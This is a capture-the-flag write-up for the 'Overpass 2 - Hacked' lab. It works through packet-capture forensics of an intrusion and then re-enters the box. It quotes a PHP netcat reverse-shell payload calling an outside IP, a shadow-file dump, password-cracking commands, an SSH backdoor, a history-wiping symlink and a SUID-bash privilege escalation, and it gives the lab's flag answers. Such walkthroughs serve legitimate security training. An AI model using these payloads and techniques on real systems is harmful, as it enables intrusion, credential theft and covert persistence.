# Overpass 2 - Hacked

Overpass has been hacked! The SOC team (Paradox, congratulations on the promotion) noticed suspicious activity on a late night shift while looking at shibes, and managed to capture packets as the attack happened.

This is a basic Network traffic analysis based from a PCAP file for signs of intrusion.


# Task 1 Forensic PCAP analysis

## Q1 What was the URL of the page they used to upload a reverse shell?

Since there should be a interaction string its worth checking TCP streams. 
```
tcp.stream eq 1
```
There is only 13 packets, the only POST packet present looks interesting with file upload.php.

To upload its a POST request to send something so I tried:
```
http.request.method=="POST" 
```
There is only one packet in info column shows POST /development/upload.php
Also listed under Hypertext>POST>Request URI: /development/upload.php

Answer Q1: /development/

## Q2 What payload did the attacker use to gain access?

From the same POST packet the easiest way to view it is via follow TCP or HTTP stream.
Answer Q2: 
```
<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
```
or can be found in the hypertext section but its broken into a series of very short lines.

## Q3 What password did the attacker use to privesc?

From the payload we can see the connection back to c2 is via port 4242.

Search for port 4242 and follow the TCP or http traffic: 
```
tcp.port==4242
```

Only a few packets down it shows the password and username james:

Answer Q3: whenevernoteartinstant

Note the sudo -l in the follow list from this search shows the user james seems to have sudo access to (ALL : ALL) ALL, which is significant.

```
/bin/sh: 0: can't access tty; job control turned off

$ id

uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ python3 -c 'import pty;pty.spawn("/bin/bash")'

www-data@overpass-production:/var/www/html/development/uploads$ ls -lAh

total 8.0K
-rw-r--r-- 1 www-data www-data 51 Jul 21 17:48 .overpass
-rw-r--r-- 1 www-data www-data 99 Jul 21 20:34 payload.php
www-data@overpass-production:/var/www/html/development/uploads$ 

cat .overpass

,LQ?2>6QiQ$JDE6>Q[QA2DDQiQH96?6G6C?@E62CE:?DE2?EQN.

www-data@overpass-production:/var/www/html/development/uploads$ su james

Password: 
whenevernoteartinstant


james@overpass-production:/var/www/html/development/uploads$ cd ~

james@overpass-production:~$ 
sudo -l

[sudo] password for james: 
whenevernoteartinstant


Matching Defaults entries for james on overpass-production:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on overpass-production:
    (ALL : ALL) ALL

james@overpass-production:~$ sudo cat /etc/shadow

sudo cat /etc/shadow
...
james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::
szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::
james@overpass-production:~$ 
git clone https://github.com/NinjaJc01/ssh-backdoor


<git clone https://github.com/NinjaJc01/ssh-backdoor
Cloning into 'ssh-backdoor'...
remote: Enumerating objects: 18, done.        
remote: Counting objects:   5% (1/18)        
...
remote: Counting objects: 100% (18/18), done.        
remote: Compressing objects:   6% (1/15)        
...
remote: Compressing objects: 100% (15/15), done.        
Unpacking objects:   5% (1/18)   
...
Unpacking objects: 100% (18/18), done.


james@overpass-production:~$ cd ssh-backdoor

james@overpass-production:~/ssh-backdoor$ ssh-keygen

Generating public/private rsa key pair.
Enter file in which to save the key (/home/james/.ssh/id_rsa): id_rsa

Enter passphrase (empty for no passphrase): 

Enter same passphrase again: 

Your identification has been saved in id_rsa.
Your public key has been saved in id_rsa.pub.
The key fingerprint is:
SHA256:z0OyQNW5sa3rr6mR7yDMo1avzRRPcapaYwOxjttuZ58 james@overpass-production
The key's randomart image is:
+---[RSA 2048]----+
|        .. .     |
|       .  +      |
|      o   .=.    |
|     . o  o+.    |
|      + S +.     |
|     =.o %.      |
|    ..*.% =.     |
|    .+.X+*.+     |
|   .oo=++=Eo.    |
+----[SHA256]-----+
james@overpass-production:~/ssh-backdoor$ chmod +x backdoor

james@overpass-production:~/ssh-backdoor$ ./backdoor -a

6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed

SSH - 2020/07/21 20:36:56 Started SSH backdoor on 0.0.0.0:2222
```


## Q4 How did the attacker establish persistence?

Answer Q4: https://github.com/NinjaJc01/ssh-backdoor

Clearly from the previous follow on port 4242 it shows a ssh backdoor downloaded from github and at the very end after an ssh key is generated stored in normal location for ssh keys. The backdoor is loacted in folder ssh-backdoor.

## Q5 Using the fasttrack wordlist, how many of the system passwords were crackable?

Answer Q5: 4

Fasttrack is a hint for quick wordlist and its not in default or seclists. It was downloaded from 
- https://github.com/drtychai/wordlists/blob/master/fasttrack.txt
- The shadow file only had 6 hashes in total, the lines with * have no passwords allocated to the users. 
- The github repository was downloaded to have a closer look, main.go appears to be configuration file, it shows function for combining a salt with hash:
- HashID does confirm sha512 and a few other types but the main.go clearly states its a sha512 and shows format hash.salt. 
- Hashcat website (one line per hash type) or using hashcat --example-hashes (half page per hash type).
```
From website (M value, type and an example, key is that salt is seperate with colon for format in hashcat)
1700	SHA2-512	82a9dda829eb7f8ffe9fbe49e45d47d2dad9664fbb7adf72492e3c81ebd3e29134d9bc12212bf83c6840f10e8246b9db54a4859b7ccd0123d86e5872c1e5082f
1710	sha512($pass.$salt)	e5c3ede3e49fb86592fb03f471c35ba13e8d89b8ab65142c9a8fdafb635fa2223c24e5558fd9313e8995019dcbec1fb584146b7bb12685c7765fc8c0d51379fd:6352283260
1720	sha512($salt.$pass)	976b451818634a1e2acba682da3fd6efa72adf8a7a08d7939550c244b237c72c7d42367544e826c0c83fe5c02f97c0373b6b1386cc794bf0d21d2df01bb9c08a:2613516180127
1800	sha512crypt $6$, SHA512 (Unix) 2	$6$qdMgClgO2dQWB37F$jhexCX1SdsCAi0OZmoRVAPnWSwuP/mHVhXIMJfKlaacxFkwWLDZ0ViF8Ur3WcHashcatVp2WShcEILi8QZCbt/
```
The 6 last shadow file entries align to m 1800 and from main.go file the 1710 option with salt appended is best suited.
```
func hashPassword(password string, salt string) string {
	hash := sha512.Sum512([]byte(password + salt))
	return fmt.Sprintf("%x", hash)
}
```
On closer look -m value of 1800 seemed to suit this hash type. Using hashcat with a GPU 4 password were found.

Paradox - $6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:secuirty3
bee - $6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:secret12
szymex - $6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:abcd123
muirland - $6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:1qaz2wsx

Hashcat format used:
```
hashcat -a 0 -m 1800 hashesfile.txt fasttrack2.txt --potfile-path mypot.txt
```

In case you lose potfile:
```
sudo find / -type f -name "hashcat.potfile" 2>/dev/null
 
/home/<username>/.local/share/hashcat/hashcat.potfile
```
John the ripper was the same results with fasttrack.txt wordlist.
```
john hashesfile.txt --wordlist=fasttrack.txt 
```
# Task 2 Research - Analyse the code.

## Q1 What's the default hash for the backdoor? Answer found in main.go file.

- The github respository for backdoor was downloaded and inspected, the main file of interest is the main.go. 
- main.go is the core backdoor server. It starts a fake SSH service, accepts incoming connections, authenticates using a hard‑coded password, and then gives the attacker an interactive remote shell (a real PTY) over that SSH session. It is essentially a malicious SSH server that drops you straight into a shell.

Answer Q1: 
```
bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3
```

## Q2 What's the hardcoded salt for the backdoor? Answer found in same file.

Answer Q2: 
```
1c362db832f3f864c8c2fe05f2002a05
```

## Q3 What was the hash that the attacker used? - go back to the PCAP for this!

Answer: 
```
6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
```

## Q4 Crack the hash using rockyou and a cracking tool of your choice. What's the password?

This is above hash with salt combined (hash:salt), then with hashcat, this format will require the m value 1710, or reverse order and use 1720.

Answer Q4: november16

# Task 3 Attack - Get back in

- Now that the incident is investigated, Paradox needs someone to take control of the Overpass production server again.
- There's flags on the box that Overpass can't afford to lose by formatting the server!

## Q1 The attacker defaced the website. What message did they leave as a heading?

Answer Q1: H4ck3d by CooctusClan

## Q2 Using the information you've found previously, hack your way back in! 
- Hint given: This is the hint you’re looking for: Note: If you get an error saying "Unable to negotiate with <IP> port 22: no matching how to key type", this is because OpenSSH have deprecated ssh-rsa. Add "-oHostKeyAlgorithms=+ssh-rsa" to your command to connect.

Answer Q2: none required.

- Tried port 22 but no success with james not surprising, the new password was for port 2222 used by backdoor.
```
# ssh james@<TargetIP> -p 2222 -oHostKeyAlgorithms=+ssh-rsa 
The authenticity of host '[<TargetIP>]:2222 ([<TargetIP>]:2222)' can't be established.
RSA key fingerprint is SHA256:z0OyQNW5sa3rr6mR7yDMo1avzRRPcapaYwOxjttuZ58.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[<TargetIP>]:2222' (RSA) to the list of known hosts.
james@<TargetIP>'s password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

james@overpass-production:/home/james/ssh-backdoor$ 

```

## Q3 What's the user flag?

```
james@overpass-production:/home/james$ ls
ssh-backdoor  user.txt  www
james@overpass-production:/home/james$ cat user.txt
thm{d119b4fa8c497ddb0525f7ad200e6567}
```

Answer Q3: thm{d119b4fa8c497ddb0525f7ad200e6567}

## Q4 What's the root flag?

First off just looking through files and folders immediately around the access used in Q3. Just looking at permissions to files and folders in the /home/james directory we find three files immediately of interest in this directory:
- The suid bit set on the .suid_bash hidden file.
- While .suid_as_admin_successful has no content is likely a flag to highlight your in right directory look deeper here.
- The attacker replaced .bash_history with a symlink to /dev/null. Anything Bash tries to write to history is discarded. This is a classic attacker anti-forensics technique.
- .bash_history is a file that is normally found in linux.

First here is a ls -la results for /home/james directory after I will explain the symlink:
```
james@overpass-production:/home/james$ ls -la
total 1136
drwxr-xr-x 7 james james    4096 Jul 22  2020 .
drwxr-xr-x 7 root  root     4096 Jul 21  2020 ..
lrwxrwxrwx 1 james james       9 Jul 21  2020 .bash_history -> /dev/null
-rw-r--r-- 1 james james     220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 james james    3771 Apr  4  2018 .bashrc
drwx------ 2 james james    4096 Jul 21  2020 .cache
drwx------ 3 james james    4096 Jul 21  2020 .gnupg
drwxrwxr-x 3 james james    4096 Jul 22  2020 .local
-rw------- 1 james james      51 Jul 21  2020 .overpass
-rw-r--r-- 1 james james     807 Apr  4  2018 .profile
-rw-r--r-- 1 james james       0 Jul 21  2020 .sudo_as_admin_successful
-rwsr-sr-x 1 root  root  1113504 Jul 22  2020 .suid_bash
drwxrwxr-x 3 james james    4096 Jul 22  2020 ssh-backdoor
-rw-rw-r-- 1 james james      38 Jul 22  2020 user.txt
drwxrwxr-x 7 james james    4096 Jul 21  2020 www
james@overpass-production:/home/james$ 
```

How attackers create a .bash_history → /dev/null symlink
- This is a classic anti‑forensics trick.
- The attacker simply replaces the normal .bash_history file with a symbolic link that points to /dev/null.

The command is:
```
ln -sf /dev/null ~/.bash_history
```
Breakdown:
- ln -s → create symbolic link
- -f → force overwrite if .bash_history already exists
- /dev/null → the “black hole” device
- ~/.bash_history → where Bash normally writes command history

## A closer look at the .suid_bash script file using head command:

The .suid_bash file on closer inspection is a compiled 64‑bit Linux ELF executable, not a script, not text, and not “obfuscated” — just raw machine code from a SUID backdoor binary used in the Overpass‑2 challenge.

Below is top of the file using head command. Based on the bytes you showed:
- It begins with the ELF magic header
- It contains the dynamic loader path: /lib64/ld-linux-x86-64.so.2
- It contains GNU build‑ID sections (GNUGNU)
- It contains binary machine code, which your terminal renders as �

This confirms:
- It is a 64‑bit dynamically linked ELF executable
- It was compiled with the GNU toolchain
- It is not obfuscated — it’s just binary
- It matches the malicious SUID backdoor from Overpass‑2
- Note head tries to interpret binary bytes as UTF-8 and fail thats why there are:
   - \ufffd replacement characters
   - Random symbols
   - Broken control bytes
   - Normal for a compiled program

```
/home/james$ heahead .suid_bash
ELF> @\ufffd\ufffd@8	@@@\ufffd884 \ufffd=\ufffd=0\ufffd=0\u0537xS 0f0f00fTTTDDP\ufffdtd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdB\ufffdBQ\ufffdtdR\ufffdtd\ufffd=\ufffd=0\ufffd=0p2p2/lib64/ld-linux-x86-64.so.2GNUGNU\ufffd=z\ufffd"lf04R\ufffd\ufffd\ufffd\ufffd\ufffd-\ufffd\ufffd	00
     #!Jzd\ufffd\ufffdAP\ufffdDDB \ufffd	\ufffd\ufffd@\ufffdAJ\ufffd\ufffd!Ih\ufffda"r\ufffd
NL\ufffd@@@\ufffdAB
\ufffd0\ufffdI\ufffd\ufffd\ufffdq\ufffd(\ufffdh@\ufffd(\ufffd\ufffd
                 H &RD!D 
                         \ufffd\ufffd $DJ\ufffd\ufffdP`
\ufffd @A\ufffd4`@ABd L\ufffd0 d\ufffdP\ufffdCDB\ufffd@\ufffdE % 32B\ufffdX\ufffd\ufffd\ufffd@T\ufffd\ufffdD$\ufffd 
\ufffd\ufffd @A\ufffd%
\ufffd
\ufffd!0`0 	@@ \ufffdb\ufffdBh
               HB\ufffdH\ufffd\ufffd
\ufffdXq\ufffd@\ufffd\ufffd\ufffd \ufffd\ufffdY         \ufffd`1B\ufffd
BdH\ufffd(0\ufffd"BB1@\ufffd
             p2
 s\ufffd0 \ufffd"\ufffd\ufffdBi\ufffd\ufffd$DF\ufffd0"\ufffd )4\ufffd\ufffd\ufffd\ufffd$
=\ufffdHdL@\ufffd\ufffd\ufffd0\ufffd( 0D@kBD\ufffd\ufffdH`\ufffd$yh\ufffd\ufffd@(\ufffd\ufffd>\ufffd5\ufffdR\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd\ufffd@!\ufffd%) PH\ufffd\ufffd\ufffd\ufffd
bP\ufffdAbB\ufffdP@\ufffd\ufffdL\ufffd.<\ufffdB@&J\ufffdD0\ufffd8`
                          \ufffdPP0D\ufffd\ufffd\ufffd``
                                     \ufffd\ufffdH\ufffd\ufffd`\ufffd\ufffdP3\ufffd0!\ufffd \ufffdBL 9E$!( B\ufffdD@"\ufffd@@\ufffd \ufffdXDB\ufffd\ufffd\ufffd\ufffdQ\ufffd(\ufffd
h\ufffd@\ufffd\ufffd\ufffd#\ufffd6A`\ufffd\ufffd/\ufffd#(
                 G8\ufffd0\ufffdDÐP
james@overpass-production:/home/james$ 
```
## Back to finding the root flag for Q4 of task 3

Comparison of without and with the .suid_bash script exploit used to gain access to root.

First without fails as expected to root folder as james does not have permissions:
```
james@overpass-production:/home/james$ id
uid=1000(james) gid=1000(james) groups=1000(james),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
james@overpass-production:/home/james$ cd /root
bash: cd: /root: Permission denied
```

Now just trying the .suid_bash file and I realise something was missing the -p. 
- As soon as the script file runs it revers back to james permissions, 
- -p is required to maintain the suid permissions throughout use:
```
james@overpass-production:/home/james$ ./.id
uid=1000(james) gid=1000(james) groups=1000(james),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
james@overpass-production:/home/james$ ./.suid_bash   
.suid_bash-4.4$ cd /root
.suid_bash: cd: /root: Permission denied
.suid_bash-4.4$ id
uid=1000(james) gid=1000(james) groups=1000(james),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
.suid_bash-4.4$ 
```
Now with the -p: 
- The kernal still configures uid and gid same for james
- The however euid=o(root) same for egid, -p preserves the euid and egid, its then possible to operate with root permissions to access the root directory contents:
```
james@overpass-production:/home/james$ ./.suid_bash -p
.suid_bash-4.4# id      
uid=1000(james) gid=1000(james) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),1000(james)
.suid_bash-4.4# cd /root
.suid_bash-4.4# pwd
/root
.suid_bash-4.4# ls
root.txt
.suid_bash-4.4# cat root.txt
thm{d53b2684f169360bb9606c333873144d}
.suid_bash-4.4# 
```
Answer Q4: thm{d53b2684f169360bb9606c333873144d}
